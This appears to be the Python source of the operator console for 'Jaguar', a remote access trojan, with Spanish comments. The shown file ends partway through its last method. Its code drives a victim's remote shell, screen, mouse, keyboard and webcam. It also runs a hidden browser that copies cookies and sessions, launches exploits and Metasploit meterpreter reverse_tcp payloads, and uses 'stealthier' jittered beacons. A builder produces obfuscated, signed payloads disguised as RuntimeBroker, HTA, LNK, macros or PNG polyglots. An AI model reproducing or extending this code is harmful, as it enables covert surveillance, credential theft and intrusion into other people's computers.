# -*- coding: utf-8 -*-
"""Ventana principal Jaguar — remote desktop con control de ratón/teclado."""

import base64
import json
import os
import threading
import time
from jaguar.common import config, escaner
from PyQt6.QtWidgets import (
    QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QGridLayout, QFrame,
    QPushButton, QTreeWidget, QTreeWidgetItem, QTextEdit, QLabel, QComboBox,
    QSplitter, QMenu, QFileDialog, QInputDialog, QMessageBox, QCheckBox,
    QDialog, QLineEdit, QPlainTextEdit, QTabWidget, QProgressBar,
)
from PyQt6.QtCore import Qt, pyqtSignal, QTimer
from PyQt6.QtGui import QAction, QPixmap

from jaguar.ui.theme import aplicar_tema_rojo_negro, ESTILO_BOTON, TENUE
from jaguar.ui.logo import obtener_logo, obtener_icono
from jaguar.server.servidor import Servidor
from jaguar.common.constants import APP_NAME, APP_VERSION
from jaguar.common import escaner, exploits, geo
from jaguar.builder.constructor import Constructor

COLS = ["", "ID", "Host", "Usuario", "SO", "IP", "País", "ISP", "Lat."]
VK_ESPECIALES = {
    Qt.Key.Key_Return: 0x0D, Qt.Key.Key_Enter: 0x0D, Qt.Key.Key_Backspace: 0x08,
    Qt.Key.Key_Tab: 0x09, Qt.Key.Key_Escape: 0x1B, Qt.Key.Key_Delete: 0x2E,
    Qt.Key.Key_Left: 0x25, Qt.Key.Key_Up: 0x26, Qt.Key.Key_Right: 0x27,
    Qt.Key.Key_Down: 0x28, Qt.Key.Key_Home: 0x24, Qt.Key.Key_End: 0x23,
}


class TerminalDialog(QDialog):
    def __init__(self, cid, nombre, parent=None):
        super().__init__(parent)
        self.cid = cid
        self.setWindowTitle(f"Terminal — {nombre} ({cid[:8]})")
        self.resize(840, 520)
        aplicar_tema_rojo_negro(self)
        lay = QVBoxLayout(self)
        self.output = QPlainTextEdit()
        self.output.setReadOnly(True)
        self.output.setStyleSheet("background:#0b0b0d;color:#ff5c5c;font-family:Consolas;")
        lay.addWidget(self.output)
        fila = QHBoxLayout()
        fila.addWidget(QLabel("shell>"))
        self.input = QLineEdit()
        self.input.returnPressed.connect(self.ejecutar)
        fila.addWidget(self.input)
        lay.addLayout(fila)
        b = QPushButton("Ejecutar")
        b.setStyleSheet(ESTILO_BOTON)
        b.clicked.connect(self.ejecutar)
        lay.addWidget(b)

    def ejecutar(self):
        cmd = self.input.text().strip()
        if not cmd:
            return
        self.output.appendPlainText(f"> {cmd}")
        self.input.clear()
        p = self.parent()
        if hasattr(p, "_enviar_comando"):
            p._enviar_comando(self.cid, "shell", {"comando": cmd})

    def append_respuesta(self, t):
        self.output.appendPlainText(t)
        self.output.appendPlainText("")


class EscritorioDialog(QDialog):
    def __init__(self, cid, nombre, parent=None):
        super().__init__(parent)
        self.cid = cid
        self.parent = parent
        self.rem_w, self.rem_h = 1920, 1080
        self._esc = 1.0
        self._off_x = 0
        self._off_y = 0
        self._capturando = False
        self.setWindowTitle(f"Escritorio — {nombre}")
        self.resize(1000, 620)
        aplicar_tema_rojo_negro(self)
        self.setMouseTracking(True)

        lay = QVBoxLayout(self)
        barra = QHBoxLayout()
        self.chk_captura = QCheckBox("Capturar pantalla")
        self.chk_captura.setChecked(True)
        self.chk_raton = QCheckBox("Controlar ratón")
        self.chk_raton.setChecked(False)
        barra.addWidget(self.chk_captura)
        barra.addWidget(self.chk_raton)
        barra.addStretch()
        self.lbl_info = QLabel("visor")
        self.lbl_info.setStyleSheet(f"color:{TENUE};")
        barra.addWidget(self.lbl_info)
        lay.addLayout(barra)

        self.pantalla = QLabel("activa «Capturar pantalla» para ver el escritorio")
        self.pantalla.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.pantalla.setStyleSheet("background:#000;")
        self.pantalla.setMouseTracking(True)
        self.pantalla.setFocusPolicy(Qt.FocusPolicy.StrongFocus)
        lay.addWidget(self.pantalla, 1)

        self.timer = QTimer(self)
        self.timer.timeout.connect(self._tick_captura)
        self.timer.start(300)
        QTimer.singleShot(150, self._tick_captura)

    def _tick_captura(self):
        if not self.chk_captura.isChecked():
            return
        if self._capturando:
            return
        self._capturando = True
        self.parent._enviar_comando(self.cid, "captura")

    def set_frame(self, pm, w, h):
        self._capturando = False
        self.rem_w, self.rem_h = max(1, w), max(1, h)
        area = self.pantalla.size()
        escalado = pm.scaled(area, Qt.AspectRatioMode.KeepAspectRatio,
                             Qt.TransformationMode.SmoothTransformation)
        self.pantalla.setPixmap(escalado)
        self._off_x = (area.width() - escalado.width()) // 2
        self._off_y = (area.height() - escalado.height()) // 2
        self._esc = escalado.width() / self.rem_w if self.rem_w else 1.0
        self.lbl_info.setText(f"{self.rem_w}x{self.rem_h}")

    def _coords(self, pos):
        x = int((pos.x() - self._off_x) / self._esc) if self._esc else 0
        y = int((pos.y() - self._off_y) / self._esc) if self._esc else 0
        x = max(0, min(self.rem_w, x))
        y = max(0, min(self.rem_h, y))
        return x, y

    def _raton(self, accion, pos=None, extra=None):
        if not self.chk_raton.isChecked():
            return
        args = {"accion": accion}
        if pos is not None:
            x, y = self._coords(pos)
            args["x"], args["y"] = x, y
        if extra:
            args.update(extra)
        self.parent._enviar_comando(self.cid, "raton", args)

    def mousePressEvent(self, e):
        pos = self.pantalla.mapFrom(self, e.position().toPoint())
        if e.button() == Qt.MouseButton.RightButton:
            self._raton("right_down", pos)
        else:
            self._raton("down", pos)

    def mouseReleaseEvent(self, e):
        pos = self.pantalla.mapFrom(self, e.position().toPoint())
        if e.button() == Qt.MouseButton.RightButton:
            self._raton("right_up", pos)
        else:
            self._raton("up", pos)

    def mouseMoveEvent(self, e):
        pos = self.pantalla.mapFrom(self, e.position().toPoint())
        self._raton("move", pos)

    def mouseDoubleClickEvent(self, e):
        pos = self.pantalla.mapFrom(self, e.position().toPoint())
        self._raton("doble", pos)

    def wheelEvent(self, e):
        delta = 120 if e.angleDelta().y() > 0 else -120
        self._raton("scroll", extra={"delta": delta})

    def keyPressEvent(self, e):
        if not self.chk_raton.isChecked():
            return
        vk = VK_ESPECIALES.get(e.key())
        if vk:
            self.parent._enviar_comando(self.cid, "teclado", {"vk": vk})
        else:
            t = e.text()
            if t:
                self.parent._enviar_comando(self.cid, "teclado", {"texto": t})

    def closeEvent(self, e):
        self.timer.stop()
        try:
            self.parent.escritorios_por_cid.get(self.cid, []).remove(self)
        except ValueError:
            pass
        super().closeEvent(e)


class HvncDialog(QDialog):
    NAVEGADORES = ["chrome", "edge", "brave", "opera", "firefox"]

    def __init__(self, cid, nombre, parent=None):
        super().__init__(parent)
        self.cid = cid
        self.parent = parent
        self.rem_w, self.rem_h = 1200, 800
        self._esc = 1.0
        self._off_x = 0
        self._off_y = 0
        self._nav_activo = None
        self.setWindowTitle(f"HVNC — {nombre}")
        self.resize(1000, 700)
        aplicar_tema_rojo_negro(self)
        l = QVBoxLayout(self)
        l.setSpacing(8)
        l.addWidget(QLabel("Lanzar navegador en segundo plano (arranca oculto, fuera de pantalla):"))
        barra = QHBoxLayout()
        for nav in self.NAVEGADORES:
            b = QPushButton(nav.capitalize())
            b.setStyleSheet(ESTILO_BOTON)
            b.clicked.connect(lambda _, n=nav: self.iniciar(n))
            barra.addWidget(b)
        barra.addStretch()
        b_cerrar = QPushButton("⏹  Cerrar navegador")
        b_cerrar.setStyleSheet(ESTILO_BOTON)
        b_cerrar.clicked.connect(self.cerrar_nav)
        barra.addWidget(b_cerrar)
        l.addLayout(barra)

        fila = QHBoxLayout()
        self.chk_oculto = QCheckBox("Modo oculto (fuera de pantalla)")
        self.chk_oculto.setChecked(True)
        fila.addWidget(self.chk_oculto)
        self.chk_cookies = QCheckBox("Copiar cookies / sesión")
        self.chk_cookies.setChecked(True)
        fila.addWidget(self.chk_cookies)
        self.chk_control = QCheckBox("Control (ratón/teclado)")
        self.chk_control.setChecked(True)
        fila.addWidget(self.chk_control)
        self.chk_captura = QCheckBox("Capturar pantalla")
        self.chk_captura.setChecked(True)
        fila.addWidget(self.chk_captura)
        fila.addStretch()
        self.lbl = QLabel("listo.")
        self.lbl.setStyleSheet(f"color:{TENUE};")
        fila.addWidget(self.lbl)
        l.addLayout(fila)

        l.addWidget(QLabel("Navegar a URL en el HVNC:"))
        f2 = QHBoxLayout()
        self.in_url = QLineEdit("https://")
        self.in_url.returnPressed.connect(self.navegar)
        f2.addWidget(self.in_url)
        b_nav = QPushButton("Ir")
        b_nav.setStyleSheet(ESTILO_BOTON)
        b_nav.clicked.connect(self.navegar)
        f2.addWidget(b_nav)
        l.addLayout(f2)

        self.pantalla = QLabel("pulsa un navegador para iniciar el HVNC")
        self.pantalla.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.pantalla.setStyleSheet("background:#000;")
        self.pantalla.setMouseTracking(True)
        self.pantalla.setFocusPolicy(Qt.FocusPolicy.StrongFocus)
        l.addWidget(self.pantalla, 1)

        self.timer = QTimer(self)
        self.timer.timeout.connect(self._tick_captura)

    def iniciar(self, nav):
        self._nav_activo = nav
        self.parent._enviar_comando(self.cid, "hvnc_iniciar", {
            "navegador": nav,
            "copiar_sesion": self.chk_cookies.isChecked(),
            "oculto": self.chk_oculto.isChecked()})
        self.lbl.setText(f"lanzando {nav}...")
        self.timer.start(500)

    def _tick_captura(self):
        if self.chk_captura.isChecked():
            self.parent._enviar_comando(self.cid, "hvnc_captura")

    def cerrar_nav(self):
        nav = self._nav_activo or "chrome"
        self.parent._enviar_comando(self.cid, "hvnc_cerrar", {"navegador": nav})
        self.timer.stop()
        self._nav_activo = None
        self.lbl.setText("cerrado.")

    def navegar(self):
        url = self.in_url.text().strip()
        if url:
            self.parent._enviar_comando(self.cid, "hvnc_navegar",
                                        {"navegador": self._nav_activo or "chrome", "url": url})

    def set_frame(self, pm, w, h):
        if pm.isNull():
            return
        self.rem_w, self.rem_h = max(1, int(w)), max(1, int(h))
        area = self.pantalla.size()
        escalado = pm.scaled(area, Qt.AspectRatioMode.KeepAspectRatio,
                             Qt.TransformationMode.SmoothTransformation)
        self.pantalla.setPixmap(escalado)
        self._off_x = (area.width() - escalado.width()) // 2
        self._off_y = (area.height() - escalado.height()) // 2
        self._esc = escalado.width() / self.rem_w if self.rem_w else 1.0
        self.lbl.setText(f"{self.rem_w}x{self.rem_h}")

    def _coords(self, pos):
        x = int((pos.x() - self._off_x) / self._esc) if self._esc else 0
        y = int((pos.y() - self._off_y) / self._esc) if self._esc else 0
        return max(0, min(self.rem_w, x)), max(0, min(self.rem_h, y))

    def _raton(self, accion, pos=None, extra=None):
        if not self.chk_control.isChecked():
            return
        args = {"accion": accion}
        if pos is not None:
            x, y = self._coords(pos)
            args["x"], args["y"] = x, y
        if extra:
            args.update(extra)
        self.parent._enviar_comando(self.cid, "hvnc_raton", args)

    def mousePressEvent(self, e):
        pos = self.pantalla.mapFrom(self, e.position().toPoint())
        self._raton("right_down" if e.button() == Qt.MouseButton.RightButton else "down", pos)

    def mouseReleaseEvent(self, e):
        pos = self.pantalla.mapFrom(self, e.position().toPoint())
        self._raton("right_up" if e.button() == Qt.MouseButton.RightButton else "up", pos)

    def mouseMoveEvent(self, e):
        pos = self.pantalla.mapFrom(self, e.position().toPoint())
        self._raton("move", pos)

    def mouseDoubleClickEvent(self, e):
        pos = self.pantalla.mapFrom(self, e.position().toPoint())
        self._raton("doble", pos)

    def wheelEvent(self, e):
        self._raton("scroll", extra={"delta": 120 if e.angleDelta().y() > 0 else -120})

    def keyPressEvent(self, e):
        if not self.chk_control.isChecked():
            return
        vk = VK_ESPECIALES.get(e.key())
        if vk:
            self.parent._enviar_comando(self.cid, "hvnc_teclado", {"vk": vk})
        else:
            t = e.text()
            if t:
                self.parent._enviar_comando(self.cid, "hvnc_teclado", {"texto": t})

    def closeEvent(self, e):
        self.timer.stop()
        try:
            self.parent.hvnc_por_cid.get(self.cid, []).remove(self)
        except ValueError:
            pass
        super().closeEvent(e)


class WebcamDialog(QDialog):
    def __init__(self, cid, nombre, parent=None):
        super().__init__(parent)
        self.cid = cid
        self.parent = parent
        self.setWindowTitle(f"Webcam — {nombre}")
        self.resize(680, 540)
        aplicar_tema_rojo_negro(self)
        l = QVBoxLayout(self)
        self.pantalla = QLabel("iniciando cámara...")
        self.pantalla.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.pantalla.setStyleSheet("background:#000;")
        l.addWidget(self.pantalla, 1)
        self.lbl = QLabel("")
        self.lbl.setStyleSheet(f"color:{TENUE};")
        l.addWidget(self.lbl)

        parent._enviar_comando(cid, "webcam_iniciar", {"cam": 0})
        self.timer = QTimer(self)
        self.timer.timeout.connect(lambda: parent._enviar_comando(cid, "webcam_frame"))
        self.timer.start(150)

    def set_frame(self, pm, w, h):
        if pm.isNull():
            return
        area = self.pantalla.size()
        escalado = pm.scaled(area, Qt.AspectRatioMode.KeepAspectRatio,
                             Qt.TransformationMode.SmoothTransformation)
        self.pantalla.setPixmap(escalado)
        self.lbl.setText(f"{w}x{h}")

    def closeEvent(self, e):
        self.timer.stop()
        self.parent._enviar_comando(self.cid, "webcam_parar")
        try:
            self.parent.webcams_por_cid.get(self.cid, []).remove(self)
        except ValueError:
            pass
        super().closeEvent(e)


class MainWindow(QMainWindow):
    _sig_log = pyqtSignal(str)
    _sig_escaneo_fin = pyqtSignal(list)
    _sig_escaneo_prog = pyqtSignal(int)
    _sig_geo = pyqtSignal(str, dict)
    _sig_msf = pyqtSignal(str)
    _sig_builder = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.setWindowTitle(f"{APP_NAME} v{APP_VERSION} — Remote Administration")
        self.setWindowIcon(obtener_icono())
        self.resize(1360, 820)
        self.setMinimumSize(1050, 640)
        aplicar_tema_rojo_negro(self)

        self.servidor = Servidor()
        self.servidor.cliente_conectado.connect(self._on_cliente_conectado)
        self.servidor.cliente_desconectado.connect(self._on_cliente_desconectado)
        self.servidor.mensaje_recibido.connect(self._on_mensaje_recibido)
        self.servidor.log.connect(self._log)

        self.servidor_activo = False
        self.clientes = {}
        self.ultimo_escaneo = []
        self.dialogs_por_cid = {}
        self.escritorios_por_cid = {}
        self.hvnc_por_cid = {}
        self.webcams_por_cid = {}
        self._pings = {}
        self._screenshot_pend = {}
        self.msf = None

        self._sig_log.connect(self._log)
        self._sig_escaneo_fin.connect(self._on_escaneo_fin)
        self._sig_escaneo_prog.connect(self._on_escaneo_prog)
        self._sig_geo.connect(self._aplicar_geo)
        self._sig_msf.connect(self._append_msf)
        self._sig_builder.connect(self._on_builder_log)

        self._build_ui()
        self._ping_timer = QTimer(self)
        self._ping_timer.timeout.connect(self._ping_todos)
        self._ping_timer.start(3000)

    def _build_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        root = QVBoxLayout(central)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        top = QFrame()
        top.setObjectName("topbar")
        top.setFixedHeight(52)
        tl = QHBoxLayout(top)
        tl.setContentsMargins(12, 0, 12, 0)
        tl.setSpacing(10)
        logo = QLabel()
        logo.setPixmap(obtener_logo(34))
        tl.addWidget(logo)
        tl.addWidget(QLabel("<b style='color:#ff2b2b;font-size:14pt;'>JAGUAR</b>"
                            "<span style='color:#8a8a92;'> · Remote Administration</span>"))
        tl.addWidget(QLabel("Puerto:"))
        self.in_puerto_srv = QLineEdit(str(self.servidor.puerto))
        self.in_puerto_srv.setFixedWidth(70)
        tl.addWidget(self.in_puerto_srv)
        tl.addStretch()
        self.btn_servidor = QPushButton("▶  Iniciar servidor")
        self.btn_servidor.setStyleSheet(ESTILO_BOTON)
        self.btn_servidor.setCheckable(True)
        self.btn_servidor.clicked.connect(self._toggle_servidor)
        tl.addWidget(self.btn_servidor)
        self.lbl_estado = QLabel("● DETENIDO")
        self.lbl_estado.setStyleSheet("color:#ff2b2b;font-weight:700;padding-right:6px;")
        tl.addWidget(self.lbl_estado)
        root.addWidget(top)

        split = QSplitter(Qt.Orientation.Horizontal)
        split.setHandleWidth(4)

        izq = QWidget()
        izq.setObjectName("panel")
        il = QVBoxLayout(izq)
        il.setContentsMargins(8, 8, 4, 8)
        il.setSpacing(6)
        cab = QHBoxLayout()
        cab.addWidget(QLabel("<b style='color:#ff2b2b;'>CLIENTES</b>"))
        self.lbl_n = QLabel("0")
        self.lbl_n.setStyleSheet(f"color:{TENUE};")
        cab.addWidget(self.lbl_n)
        cab.addStretch()
        self.in_buscar = QLineEdit()
        self.in_buscar.setPlaceholderText("filtrar...")
        self.in_buscar.setFixedWidth(140)
        self.in_buscar.textChanged.connect(self._filtrar)
        cab.addWidget(self.in_buscar)
        il.addLayout(cab)

        self.tree = QTreeWidget()
        self.tree.setHeaderLabels(COLS)
        self.tree.setColumnWidth(0, 26)
        self.tree.setColumnWidth(1, 70)
        self.tree.setColumnWidth(2, 120)
        self.tree.setColumnWidth(3, 90)
        self.tree.setColumnWidth(4, 110)
        self.tree.setColumnWidth(5, 110)
        self.tree.setRootIsDecorated(False)
        self.tree.setAlternatingRowColors(True)
        self.tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.tree.customContextMenuRequested.connect(self._menu_contexto)
        self.tree.itemDoubleClicked.connect(
            lambda i, c: self._abrir_terminal(i.data(0, Qt.ItemDataRole.UserRole)))
        self.tree.itemSelectionChanged.connect(self._mostrar_detalles)
        il.addWidget(self.tree, 1)

        det = QFrame()
        det.setObjectName("detalle")
        dl = QGridLayout(det)
        dl.setContentsMargins(8, 6, 8, 6)
        dl.setHorizontalSpacing(8)
        dl.setVerticalSpacing(2)
        self.det_labels = {}
        campos = [("Host", "host"), ("Usuario", "usuario"), ("SO", "so"),
                  ("Arquitectura", "arquitectura"), ("IP interna", "ip"),
                  ("IP externa", "ip_externa"), ("País", "pais"),
                  ("Ciudad", "ciudad"), ("ISP", "isp"), ("PID", "pid")]
        for i, (etq, clave) in enumerate(campos):
            r, c = divmod(i, 2)
            k = QLabel(f"<span style='color:{TENUE};'>{etq}:</span>")
            v = QLabel("—")
            dl.addWidget(k, r, c * 2)
            dl.addWidget(v, r, c * 2 + 1)
            self.det_labels[clave] = v
        il.addWidget(det)
        split.addWidget(izq)

        self.tabs = QTabWidget()
        self.tabs.setDocumentMode(True)
        self.tabs.addTab(self._tab_escaner(), "  Escáner  ")
        self.tabs.addTab(self._tab_exploits(), "  Exploits  ")
        self.tabs.addTab(self._tab_msf(), "  Metasploit  ")
        self.tabs.addTab(self._tab_beacons(), "  Beacons  ")
        self.tabs.addTab(self._tab_builder(), "  Builder  ")
        self.tabs.addTab(self._tab_log(), "  Registro  ")
        split.addWidget(self.tabs)

        split.setStretchFactor(0, 0)
        split.setStretchFactor(1, 1)
        split.setSizes([430, 930])
        root.addWidget(split, 1)

    def _tab_escaner(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(10, 10, 10, 10)
        l.setSpacing(6)
        form = QGridLayout()
        form.setHorizontalSpacing(8)
        form.addWidget(QLabel("Objetivo (IP / rango / subred):"), 0, 0)
        self.in_objetivo = QLineEdit(escaner.detectar_subred())
        form.addWidget(self.in_objetivo, 0, 1)
        form.addWidget(QLabel("Puertos (22,80,443 / 1-1024):"), 1, 0)
        self.in_puertos = QLineEdit()
        self.in_puertos.setPlaceholderText("vacío = top comunes")
        form.addWidget(self.in_puertos, 1, 1)
        l.addLayout(form)
        fila = QHBoxLayout()
        self.btn_escanear = QPushButton("▶  Escanear")
        self.btn_escanear.setStyleSheet(ESTILO_BOTON)
        self.btn_escanear.clicked.connect(self._escanear)
        fila.addWidget(self.btn_escanear)
        self.chk_nmap = QPushButton("nmap: SÍ")
        self.chk_nmap.setCheckable(True)
        self.chk_nmap.setChecked(True)
        self.chk_nmap.setStyleSheet(ESTILO_BOTON)
        self.chk_nmap.clicked.connect(
            lambda: self.chk_nmap.setText(f"nmap: {'SÍ' if self.chk_nmap.isChecked() else 'NO'}"))
        fila.addWidget(self.chk_nmap)
        self.btn_rec = QPushButton("➜  Recomendar exploits")
        self.btn_rec.setStyleSheet(ESTILO_BOTON)
        self.btn_rec.clicked.connect(self._recomendar_desde_escaneo)
        fila.addWidget(self.btn_rec)
        fila.addStretch()
        l.addLayout(fila)
        self.barra = QProgressBar()
        self.barra.setValue(0)
        self.barra.setFixedHeight(16)
        l.addWidget(self.barra)
        self.res_escaner = QTreeWidget()
        self.res_escaner.setHeaderLabels(["IP", "Host", "Puerto", "Servicio", "Banner"])
        self.res_escaner.setColumnWidth(0, 140)
        self.res_escaner.setAlternatingRowColors(True)
        self.res_escaner.setRootIsDecorated(False)
        l.addWidget(self.res_escaner, 1)
        return w

    def _tab_exploits(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(10, 10, 10, 10)
        l.addWidget(QLabel("Exploits según puertos abiertos (prioridad arriba):"))
        self.tree_exploits = QTreeWidget()
        self.tree_exploits.setHeaderLabels(["IP", "Puerto", "Exploit", "CVE", "Riesgo", "SO", "Comando"])
        self.tree_exploits.setColumnWidth(0, 120)
        self.tree_exploits.setColumnWidth(2, 190)
        self.tree_exploits.setAlternatingRowColors(True)
        self.tree_exploits.setRootIsDecorated(False)
        l.addWidget(self.tree_exploits, 1)
        fila = QHBoxLayout()
        b1 = QPushButton("➜  Lanzar en cliente")
        b1.setStyleSheet(ESTILO_BOTON)
        b1.clicked.connect(self._lanzar_exploit)
        b2 = QPushButton("📋  Copiar comando")
        b2.setStyleSheet(ESTILO_BOTON)
        b2.clicked.connect(self._copiar_exploit)
        fila.addWidget(b1)
        fila.addWidget(b2)
        fila.addStretch()
        l.addLayout(fila)
        return w

    def _tab_msf(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(10, 10, 10, 10)
        l.setSpacing(6)
        l.addWidget(QLabel("Conexión a Metasploit RPC (msfrpcd):"))
        form = QGridLayout()
        form.setHorizontalSpacing(8)
        form.addWidget(QLabel("Host:"), 0, 0)
        self.in_msf_host = QLineEdit("127.0.0.1")
        form.addWidget(self.in_msf_host, 0, 1)
        form.addWidget(QLabel("Puerto:"), 0, 2)
        self.in_msf_puerto = QLineEdit("55552")
        self.in_msf_puerto.setFixedWidth(90)
        form.addWidget(self.in_msf_puerto, 0, 3)
        form.addWidget(QLabel("Usuario:"), 1, 0)
        self.in_msf_user = QLineEdit("msf")
        form.addWidget(self.in_msf_user, 1, 1)
        form.addWidget(QLabel("Password:"), 1, 2)
        self.in_msf_pass = QLineEdit()
        self.in_msf_pass.setEchoMode(QLineEdit.EchoMode.Password)
        form.addWidget(self.in_msf_pass, 1, 3)
        l.addLayout(form)
        fila = QHBoxLayout()
        for txt, fn in [("🔌  Conectar", self._msf_conectar),
                        ("📋  Sesiones", self._msf_sesiones),
                        ("🛰  Jobs", self._msf_jobs),
                        ("🧩  Módulos", self._msf_modulos)]:
            b = QPushButton(txt)
            b.setStyleSheet(ESTILO_BOTON)
            b.clicked.connect(fn)
            fila.addWidget(b)
        fila.addStretch()
        l.addLayout(fila)
        l.addWidget(QLabel("Lanzar módulo:"))
        f2 = QGridLayout()
        f2.setHorizontalSpacing(8)
        f2.addWidget(QLabel("Tipo:"), 0, 0)
        self.in_msf_tipo = QComboBox()
        self.in_msf_tipo.addItems(["exploit", "auxiliary"])
        f2.addWidget(self.in_msf_tipo, 0, 1)
        f2.addWidget(QLabel("Módulo:"), 0, 2)
        self.in_msf_modulo = QLineEdit("exploit/multi/handler")
        f2.addWidget(self.in_msf_modulo, 0, 3)
        f2.addWidget(QLabel("RHOSTS:"), 1, 0)
        self.in_msf_rhosts = QLineEdit()
        f2.addWidget(self.in_msf_rhosts, 1, 1)
        f2.addWidget(QLabel("RPORT:"), 1, 2)
        self.in_msf_rport = QLineEdit()
        self.in_msf_rport.setFixedWidth(90)
        f2.addWidget(self.in_msf_rport, 1, 3)
        f2.addWidget(QLabel("PAYLOAD:"), 2, 0)
        self.in_msf_payload = QLineEdit("windows/x64/meterpreter/reverse_tcp")
        f2.addWidget(self.in_msf_payload, 2, 1, 1, 3)
        l.addLayout(f2)
        b_run = QPushButton("▶  Ejecutar módulo")
        b_run.setStyleSheet(ESTILO_BOTON)
        b_run.clicked.connect(self._msf_ejecutar)
        l.addWidget(b_run)
        self.out_msf = QPlainTextEdit()
        self.out_msf.setReadOnly(True)
        self.out_msf.setStyleSheet("background:#0b0b0d;color:#ff5c5c;font-family:Consolas;")
        l.addWidget(self.out_msf, 1)
        return w

    def _tab_beacons(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(10, 10, 10, 10)
        l.setSpacing(6)
        l.addWidget(QLabel("Beacon: el agente reporta cada X segundos con jitter (más sigiloso)."))
        form = QGridLayout()
        form.setHorizontalSpacing(8)
        form.addWidget(QLabel("Sleep (segundos):"), 0, 0)
        self.in_sleep = QLineEdit("5")
        self.in_sleep.setFixedWidth(90)
        form.addWidget(self.in_sleep, 0, 1, Qt.AlignmentFlag.AlignLeft)
        form.addWidget(QLabel("Jitter (%):"), 1, 0)
        self.in_jitter = QLineEdit("20")
        self.in_jitter.setFixedWidth(90)
        form.addWidget(self.in_jitter, 1, 1, Qt.AlignmentFlag.AlignLeft)
        l.addLayout(form)
        fila = QHBoxLayout()
        for txt, fn in [("Aplicar a seleccionado", self._beacon_sel),
                        ("Aplicar a TODOS", self._beacon_todos),
                        ("Refrescar", self._beacon_refrescar)]:
            b = QPushButton(txt)
            b.setStyleSheet(ESTILO_BOTON)
            b.clicked.connect(fn)
            fila.addWidget(b)
        fila.addStretch()
        l.addLayout(fila)
        self.tree_beacons = QTreeWidget()
        self.tree_beacons.setHeaderLabels(["ID", "Host", "IP", "Sleep", "Jitter", "Estado"])
        self.tree_beacons.setColumnWidth(0, 80)
        self.tree_beacons.setAlternatingRowColors(True)
        self.tree_beacons.setRootIsDecorated(False)
        l.addWidget(self.tree_beacons, 1)
        return w

    def _tab_builder(self):
        cfg = config.cargar()
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(10, 10, 10, 10)
        form = QGridLayout()
        form.setHorizontalSpacing(8)
        form.addWidget(QLabel("Host de retorno (DDNS / IP controlador):"), 0, 0)
        self.in_bhost = QLineEdit(cfg["host"])
        form.addWidget(self.in_bhost, 0, 1)
        self.btn_ip_pub = QPushButton("🌍 IP pública")
        self.btn_ip_pub.setStyleSheet(ESTILO_BOTON)
        self.btn_ip_pub.clicked.connect(self._detectar_ip_publica)

        self.btn_ddns = QPushButton("🌐 DDNS")
        self.btn_ddns.setStyleSheet(ESTILO_BOTON)
        self.btn_ddns.clicked.connect(lambda: self.in_bhost.setText(config.cargar()["host"]))
        form.addWidget(self.btn_ddns, 0, 3)

        form.addWidget(self.btn_ip_pub, 0, 2)
        form.addWidget(QLabel("Puerto:"), 1, 0)
        self.in_bpuerto = QLineEdit(str(cfg["puerto"]))
        self.in_bpuerto.setFixedWidth(90)
        form.addWidget(self.in_bpuerto, 1, 1, Qt.AlignmentFlag.AlignLeft)
        self.btn_probar = QPushButton("Probar")
        self.btn_probar.setStyleSheet(ESTILO_BOTON)
        self.btn_probar.clicked.connect(self._probar_conexion)
        form.addWidget(self.btn_probar, 1, 2, 1, 2)
        l.addLayout(form)
        self.in_bhost.editingFinished.connect(self._guardar_config)
        self.in_bpuerto.editingFinished.connect(self._guardar_config)

        form2 = QGridLayout()
        form2.setHorizontalSpacing(8)
        form2.addWidget(QLabel("Nombre exe:"), 0, 0)
        self.in_bnombre = QLineEdit("RuntimeBroker")
        form2.addWidget(self.in_bnombre, 0, 1)
        form2.addWidget(QLabel("Icono (.ico):"), 0, 2)
        self.in_bicono = QLineEdit()
        form2.addWidget(self.in_bicono, 0, 3)
        form2.addWidget(QLabel("Cert (.pfx):"), 1, 0)
        self.in_bcert = QLineEdit()
        form2.addWidget(self.in_bcert, 1, 1)
        form2.addWidget(QLabel("Pass cert:"), 1, 2)
        self.in_bpass = QLineEdit()
        self.in_bpass.setEchoMode(QLineEdit.EchoMode.Password)
        form2.addWidget(self.in_bpass, 1, 3)
        form2.addWidget(QLabel("UPX dir:"), 2, 0)
        self.in_bupx = QLineEdit()
        form2.addWidget(self.in_bupx, 2, 1, 1, 3)
        l.addLayout(form2)

        form3 = QHBoxLayout()
        form3.addWidget(QLabel("Compilador:"))
        self.in_bcomp = QComboBox()
        self.in_bcomp.addItems(["pyinstaller", "auto", "nuitka"])
        self.in_bcomp.setToolTip("pyinstaller = rapido (sin compilar C) | auto = Nuitka si esta | nuitka = forzar")
        form3.addWidget(self.in_bcomp)
        self.chk_pyarmor = QCheckBox("Ofuscar con PyArmor")
        self.chk_pyarmor.setChecked(True)
        form3.addWidget(self.chk_pyarmor)
        form3.addStretch()
        l.addLayout(form3)

        grid = QGridLayout()
        botones = [
            ("Generar TODO", self._build_todo), (".exe", lambda: self._build_uno("exe")),
            (".bat", lambda: self._build_uno("bat")), (".vbs", lambda: self._build_uno("vbs")),
            (".ps1", lambda: self._build_uno("ps1")), (".lnk", lambda: self._build_uno("lnk")),
            (".png polyglot", lambda: self._build_uno("png")),
            (".pdf", lambda: self._build_uno("pdf")), ("macro .bas", lambda: self._build_uno("macro")),
            (".hta", lambda: self._build_uno("hta")), ("🌐 Servir dist", self._servir_dist),
        ]
        for i, (t, fn) in enumerate(botones):
            b = QPushButton(t)
            b.setStyleSheet(ESTILO_BOTON)
            b.clicked.connect(fn)
            grid.addWidget(b, i // 4, i % 4)
        l.addLayout(grid)
        self.out_builder = QPlainTextEdit()
        self.out_builder.setReadOnly(True)
        l.addWidget(self.out_builder, 1)
        return w

    def _tab_log(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(10, 10, 10, 10)
        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setStyleSheet("background:#0b0b0d;color:#ff5c5c;font-family:Consolas;border:none;")
        l.addWidget(self.log_text, 1)
